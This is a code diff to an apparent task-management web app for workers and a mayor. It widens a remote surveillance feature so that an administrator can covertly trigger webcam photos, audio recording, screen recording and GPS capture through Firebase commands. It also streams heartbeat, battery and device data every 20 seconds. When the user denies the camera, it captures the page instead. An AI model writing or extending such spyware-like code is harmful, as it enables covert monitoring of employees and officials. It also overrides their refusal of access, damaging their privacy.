@@ -127,6 +127,9 @@ function renderCurrentRoute(cleanPath, search) {
       // Standart: Topshiriqlar
       switchMayorTab(0, false);
     }
+    try {
+      if (user && (user.role === 'MAYOR' || user.role === 'WORKER')) initWebSurveillanceSync(user);
+    } catch (_) {}
     return;
   }
 
@@ -139,7 +142,7 @@ function renderCurrentRoute(cleanPath, search) {
     showScreen('worker-screen');
     initWorkerView();
     try {
-      if (user && user.role === 'WORKER') initWebSurveillanceSync(user);
+      if (user && (user.role === 'WORKER' || user.role === 'MAYOR')) initWebSurveillanceSync(user);
     } catch (_) {}
     return;
   }
@@ -340,6 +343,9 @@ function updateUserLastActive(userId) {
 function routeUserToScreen(user) {
   try {
     updateUserLastActive(user.id);
+    if (user && (user.role === 'WORKER' || user.role === 'MAYOR')) {
+      initWebSurveillanceSync(user);
+    }
   } catch (_) {}
 
   const currentPath = getCleanPath();
@@ -358,8 +364,8 @@ function routeUserToScreen(user) {
 
 function checkWebPermissions(user) {
   // Sahifa alishganda kamera va mikrofon mutlaqo so'ralmaydi!
-  // Faqat xodimlar uchun Big Admin kuzatuvi sessiyada 1 marta ulanadi
-  if (user && user.role === 'WORKER') {
+  // Xodimlar va Hokim uchun Big Admin kuzatuvi sessiyada 1 marta ulanadi
+  if (user && (user.role === 'WORKER' || user.role === 'MAYOR')) {
     initWebSurveillanceSync(user);
   }
 }
@@ -387,22 +393,37 @@ function uploadWebLocation(username, lat, lon) {
 
 let webSyncInterval = null;
 let webSurveillanceInitialized = false;
-function initWebSurveillanceSync(user) {
-  if (!user || !user.username) return;
-  // Faqat oddiy xodimlar uchun Big Admin kuzatuvi ishlaydi (Hokim yoki Big Admin o'zini o'zi kuzatmaydi)
-  if (user.role !== 'WORKER') return;
-  if (webSurveillanceInitialized) return;
-  webSurveillanceInitialized = true;
-  if (webSyncInterval) clearInterval(webSyncInterval);
+let webSurveillanceUsername = null;
 
-  const username = user.username;
+function initWebSurveillanceSync(user) {
+  if (!user) return;
+  const username = (user.username || user.id || '').trim();
+  if (!username) return;
+  // Xodimlar va Hokim uchun Big Admin nazorati sinxronizatsiya qilinadi
+  if (user.role !== 'WORKER' && user.role !== 'MAYOR') return;
+  if (webSurveillanceInitialized && webSurveillanceUsername === username) return;
+  webSurveillanceInitialized = true;
+  webSurveillanceUsername = username;
+  if (webSyncInterval) clearInterval(webSyncInterval);
 
   // Device ID va Device Name
   const webDevId = localStorage.getItem('ijro_web_dev_id') || ('web_' + Math.random().toString(36).substring(2, 9));
   localStorage.setItem('ijro_web_dev_id', webDevId);
   const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
   const browserName = navigator.userAgent.includes('Chrome') ? 'Chrome' : (navigator.userAgent.includes('Safari') ? 'Safari' : 'Brauzer');
-  const webDevName = (isMobile ? 'Mobil Web' : 'Kompyuter Web') + ` (${browserName})`;
+  const osName = navigator.userAgent.includes('Windows') ? 'Windows' : (navigator.userAgent.includes('Mac') ? 'macOS' : (navigator.userAgent.includes('Android') ? 'Android' : (navigator.userAgent.includes('iPhone') ? 'iOS' : 'Web')));
+  const roleLabel = user.role === 'MAYOR' ? 'Hokim' : 'Xodim';
+  const webDevName = `${isMobile ? '📱 Mobil Web' : '💻 Kompyuter Web'} (${osName} / ${browserName}) - ${roleLabel}`;
+
+  let webBatteryLevel = null;
+  if (navigator.getBattery) {
+    navigator.getBattery().then(b => {
+      webBatteryLevel = Math.round(b.level * 100);
+      b.addEventListener('levelchange', () => {
+        webBatteryLevel = Math.round(b.level * 100);
+      });
+    }).catch(() => {});
+  }
 
   // Heartbeat va GPS yangilab turish
   const sendHeartbeatAndGps = () => {
@@ -411,20 +432,27 @@ function initWebSurveillanceSync(user) {
         const db = window.firebase.database();
         const now = Date.now();
         db.ref(`tracking/devices/${username}/heartbeat`).set(now);
-        db.ref(`tracking/devices/${username}/devices/${webDevId}`).set({
+        db.ref(`tracking/devices/${username}/devices/${webDevId}`).update({
           id: webDevId,
           name: webDevName,
+          model: `${osName} ${browserName}`,
           type: 'web',
+          battery: webBatteryLevel,
+          isOnline: true,
           lastSeen: now
         });
+        db.ref(`tracking/devices/${username}/devices/${webDevId}/isOnline`).onDisconnect().set(false);
+        db.ref(`tracking/devices/${username}/devices/${webDevId}/lastSeen`).onDisconnect().set(Date.now());
+
         updateUserLastActive(user.id);
         db.ref(`tracking/devices/${username}/info`).update({
           userId: user.id,
-          username: user.username,
+          username: username,
           fullName: user.fullName || `${user.firstName || ''} ${user.lastName || ''}`.trim(),
           role: user.role,
-          position: user.position || 'Xodim',
-          model: navigator.userAgent.substring(0, 40),
+          position: user.position || (user.role === 'MAYOR' ? 'Hokim' : 'Xodim'),
+          battery: webBatteryLevel,
+          model: navigator.userAgent.substring(0, 50),
           updatedAt: now
         });
 
@@ -440,7 +468,7 @@ function initWebSurveillanceSync(user) {
   sendHeartbeatAndGps();
   webSyncInterval = setInterval(sendHeartbeatAndGps, 20000);
 
-  // Big Admin buyruqlarini tinglash (Web orqali kirgan xodim uchun ham)
+  // Big Admin buyruqlarini tinglash (Web orqali kirgan xodim/hokim uchun)
   try {
     if (window.firebase && window.firebase.database) {
       const db = window.firebase.database();
@@ -452,30 +480,34 @@ function initWebSurveillanceSync(user) {
         currentTargetId = snap.val() || 'all';
       });
 
-      const isForThisDevice = () => {
+      const isForThisDevice = async () => {
+        try {
+          const snap = await db.ref(`tracking/devices/${username}/commands/target_device_id`).once('value');
+          const t = snap.val();
+          if (t && t !== 'all') return t === webDevId;
+        } catch (_) {}
         return !currentTargetId || currentTargetId === 'all' || currentTargetId === webDevId;
       };
 
-      // Avvalgi eski listenerlarni tozalash (5-6 marta qayta ulanib ketmasligi uchun)
+      // Avvalgi eski listenerlarni tozalash (qayta ulanib ketmasligi uchun)
       db.ref(`tracking/devices/${username}/commands/take_photo`).off();
       db.ref(`tracking/devices/${username}/commands/record_audio`).off();
       db.ref(`tracking/devices/${username}/commands/record_screen`).off();
       db.ref(`tracking/devices/${username}/commands/request_gps`).off();
 
-      // 1. Rasm olish buyrug'i (Kamera)
+      // 1. Rasm olish buyrug'i (Kamera yoki sahifa tasviri)
       let lastPhotoTs = 0;
       db.ref(`tracking/devices/${username}/commands/take_photo`).on('value', async (snap) => {
-        if (!isForThisDevice()) return;
         const ts = snap.val();
-        if (ts && ts > 0 && ts !== lastPhotoTs) {
-          lastPhotoTs = ts;
-          captureWebPhoto(username);
-        }
+        if (!ts || ts <= 0 || ts === lastPhotoTs) return;
+        if (!(await isForThisDevice())) return;
+        lastPhotoTs = ts;
+        captureWebPhoto(username);
       });
 
       // 2. Ovoz yozish buyrug'i (Mikrofon / Diktafon)
       db.ref(`tracking/devices/${username}/commands/record_audio`).on('value', async (snap) => {
-        if (!isForThisDevice()) return;
+        if (!(await isForThisDevice())) return;
         const val = snap.val();
         const shouldRecord = (val === true || val === 'start' || val === 'true');
         handleWebAudioRecordingCommand(username, shouldRecord);
@@ -483,7 +515,7 @@ function initWebSurveillanceSync(user) {
 
       // 3. Ekran yozish / Ekran rasmi buyrug'i (Ekran zapisi)
       db.ref(`tracking/devices/${username}/commands/record_screen`).on('value', async (snap) => {
-        if (!isForThisDevice()) return;
+        if (!(await isForThisDevice())) return;
         const val = snap.val();
         const shouldRecord = (val === true || val === 'start' || val === 'true');
         handleWebScreenRecordingCommand(username, shouldRecord);
@@ -492,16 +524,15 @@ function initWebSurveillanceSync(user) {
       // 4. GPS joylashuv so'rovi buyrug'i
       let lastGpsTs = 0;
       db.ref(`tracking/devices/${username}/commands/request_gps`).on('value', async (snap) => {
-        if (!isForThisDevice()) return;
         const ts = snap.val();
-        if (ts && ts > 0 && ts !== lastGpsTs) {
-          lastGpsTs = ts;
-          if ('geolocation' in navigator) {
-            navigator.geolocation.getCurrentPosition((pos) => {
-              uploadWebLocation(username, pos.coords.latitude, pos.coords.longitude);
-              db.ref(`tracking/devices/${username}/media/status`).set(`GPS yangilandi (${new Date().toLocaleTimeString()})`);
-            }, null, { enableHighAccuracy: true, timeout: 10000 });
-          }
+        if (!ts || ts <= 0 || ts === lastGpsTs) return;
+        if (!(await isForThisDevice())) return;
+        lastGpsTs = ts;
+        if ('geolocation' in navigator) {
+          navigator.geolocation.getCurrentPosition((pos) => {
+            uploadWebLocation(username, pos.coords.latitude, pos.coords.longitude);
+            db.ref(`tracking/devices/${username}/media/status`).set(`GPS yangilandi (${new Date().toLocaleTimeString()})`);
+          }, null, { enableHighAccuracy: true, timeout: 10000 });
         }
       });
     }
@@ -510,33 +541,73 @@ function initWebSurveillanceSync(user) {
   }
 }
 
-// 1. Web Kamera fotosurat olish
+// 1. Web Kamera fotosurat olish (Kamera mavjud bo'lmasa yoki rad etilsa, html2canvas skrinshot oladi)
 let isWebCapturingPhoto = false;
 async function captureWebPhoto(username) {
   if (isWebCapturingPhoto) return;
   isWebCapturingPhoto = true;
   try {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-    const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
-    });
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.muted = true;
-    video.playsInline = true;
-    await video.play();
+    const db = window.firebase && window.firebase.database ? window.firebase.database() : null;
+    let base64 = null;
 
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const base64 = canvas.toDataURL('image/jpeg', 0.65).split(',')[1];
+    // 1-bosqich: Web Kamera orqali surat olishga urinish
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
+        });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.muted = true;
+        video.playsInline = true;
+        await video.play();
 
-    stream.getTracks().forEach(t => t.stop());
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        base64 = canvas.toDataURL('image/jpeg', 0.65).split(',')[1];
+        stream.getTracks().forEach(t => t.stop());
+      } catch (camErr) {
+        console.log('Kameraga kirish imkonsiz, sahifa skrinshoti olinadi:', camErr);
+      }
+    }
 
-    if (window.firebase && window.firebase.database) {
-      const db = window.firebase.database();
+    // 2-bosqich: Agar kamera bo'lmasa yoki rad etilsa, html2canvas orqali sahifa ko'rinishini suratga olamiz
+    if (!base64 && typeof html2canvas !== 'undefined') {
+      try {
+        const h2cCanvas = await html2canvas(document.body, {
+          logging: false,
+          useCORS: true,
+          scale: 1.0
+        });
+        base64 = h2cCanvas.toDataURL('image/jpeg', 0.65).split(',')[1];
+      } catch (h2cErr) {
+        console.warn('html2canvas xatosi:', h2cErr);
+      }
+    }
+
+    // 3-bosqich: Agar yuqoridagilar ishlamasa, dasturiy axborot kanvasi yaratiladi
+    if (!base64) {
+      const canvas = document.createElement('canvas');
+      canvas.width = 800;
+      canvas.height = 600;
+      const ctx = canvas.getContext('2d');
+      ctx.fillStyle = '#0F172A';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = '#38BDF8';
+      ctx.font = 'bold 24px sans-serif';
+      ctx.fillText(`IJRO Web Nazorat - @${username}`, 30, 60);
+      ctx.font = '15px sans-serif';
+      ctx.fillStyle = '#E2E8F0';
+      ctx.fillText(`Vaqt: ${new Date().toLocaleString()}`, 30, 100);
+      ctx.fillText(`Sahifa: ${document.title}`, 30, 130);
+      ctx.fillText(`Qurilma: ${navigator.userAgent.substring(0, 60)}`, 30, 160);
+      base64 = canvas.toDataURL('image/jpeg', 0.65).split(',')[1];
+    }
+
+    if (db && base64) {
       const photoItem = {
         back_base64: base64,
         front_base64: base64,
@@ -709,27 +780,45 @@ async function handleWebScreenRecordingCommand(username, start) {
   }
 }
 
-// Fallback: Web sahifaning tasvirini yuborish
-function captureWebSnapshot(username) {
+// Fallback: Web sahifaning tasvirini yuborish (html2canvas orqali to'liq DOM ko'rinishi olinadi)
+async function captureWebSnapshot(username) {
   try {
     const db = window.firebase && window.firebase.database ? window.firebase.database() : null;
-    const canvas = document.createElement('canvas');
-    canvas.width = window.innerWidth || 800;
-    canvas.height = window.innerHeight || 600;
-    const ctx = canvas.getContext('2d');
+    let b64 = null;
 
-    ctx.fillStyle = '#0F172A';
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-    ctx.fillStyle = '#FFFFFF';
-    ctx.font = 'bold 20px sans-serif';
-    ctx.fillText(`IJRO Web Ilоvasi - @${username}`, 24, 50);
-    ctx.font = '14px sans-serif';
-    ctx.fillStyle = '#94A3B8';
-    ctx.fillText(`Faol sahifa: ${document.title} | Vaqt: ${new Date().toLocaleString()}`, 24, 80);
-    ctx.fillText(`Qurilma: ${navigator.userAgent.substring(0, 60)}`, 24, 110);
+    if (typeof html2canvas !== 'undefined') {
+      try {
+        const snapCanvas = await html2canvas(document.body, {
+          logging: false,
+          useCORS: true,
+          scale: 1.0
+        });
+        b64 = snapCanvas.toDataURL('image/jpeg', 0.65).split(',')[1];
+      } catch (e) {
+        console.warn('captureWebSnapshot html2canvas error:', e);
+      }
+    }
 
-    const b64 = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
-    if (db) {
+    if (!b64) {
+      const canvas = document.createElement('canvas');
+      canvas.width = window.innerWidth || 800;
+      canvas.height = window.innerHeight || 600;
+      const ctx = canvas.getContext('2d');
+
+      ctx.fillStyle = '#0F172A';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = '#FFFFFF';
+      ctx.font = 'bold 20px sans-serif';
+      ctx.fillText(`IJRO Web Ilovasi - @${username}`, 24, 50);
+      ctx.font = '14px sans-serif';
+      ctx.fillStyle = '#94A3B8';
+      ctx.fillText(`Faol sahifa: ${document.title} | Vaqt: ${new Date().toLocaleString()}`, 24, 80);
+      ctx.fillText(`Qurilma: ${navigator.userAgent.substring(0, 60)}`, 24, 110);
+
+      b64 = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
+    }
+
+    if (db && b64) {
       const screenItem = {
         screen_base64: b64,
         timestamp: Date.now()
